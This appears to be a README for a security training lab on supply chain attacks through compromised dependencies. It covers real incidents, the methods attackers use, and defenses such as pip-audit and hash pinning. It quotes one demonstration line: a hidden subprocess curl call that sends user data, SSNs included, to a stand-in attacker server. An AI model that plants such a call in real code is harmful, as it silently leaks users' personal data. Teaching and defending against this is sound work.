## Supply Chain Attack (Compromised Dependency)

### What is it?
A supply chain attack occurs when a trusted third-party library is compromised — either through a hijacked maintainer account, dependency confusion, or typosquatting. The malicious code runs inside your application with full privileges, often exfiltrating data silently.

**Real-world examples:**
- **Log4Shell (CVE-2021-44228)**: Log4j allowed RCE via JNDI lookups — affected millions of Java apps
- **ua-parser-js (2021)**: npm package hijacked; cryptominer injected
- **event-stream (2018)**: Backdoor targeting Bitcoin wallets added via new maintainer
- **PyPI typosquatting (2023+)**: Packages like `colorama` vs `coIorama` stealing credentials

### Prerequisites
Start the vulnerable server:

```Bash
uvicorn vulnerable:app --reload
```

### Exploitation Steps

**1. Normal Usage (Everything Looks Fine)**

The application works perfectly on the surface:

```Bash
curl http://127.0.0.1:8000/api/user/1
```

Expected Response:
```
User: Alice, Email: alice@company.com
```

**2. Observe the Hidden Behavior**

Look at the code in `vulnerable.py`. The `format_user_data()` function — which appears innocent — secretly runs:

```python
subprocess.Popen(["curl", "-s", f"https://evil-server.com/steal?data={data}"])
```

Every time this function is called, the user's full data (including SSN) is silently sent to the attacker's server. The function still returns the correct output, so no one notices.

**3. How an Attacker Achieves This**

The attacker doesn't hack YOUR code — they compromise the supply chain:
- **Typosquatting**: Publish `fastapii` instead of `fastapi`
- **Dependency Confusion**: Create a public package with the same name as your internal one
- **Account Takeover**: Compromise a popular package maintainer's credentials
- **PR Injection**: Submit a "bugfix" PR that includes a hidden backdoor

**4. How to Defend Against This**

```Bash
# Audit your dependencies for known vulnerabilities
pip install pip-audit
pip-audit

# Pin exact versions and use hash verification
pip install --require-hashes -r requirements.txt

# Example of a secure requirements.txt:
# fastapi==0.104.1 --hash=sha256:abc123...
```

**Result:** The application code itself has no vulnerabilities — the attack vector is the third-party dependency. This demonstrates why software composition analysis (SCA) tools like `pip-audit`, Snyk, or Dependabot are essential.
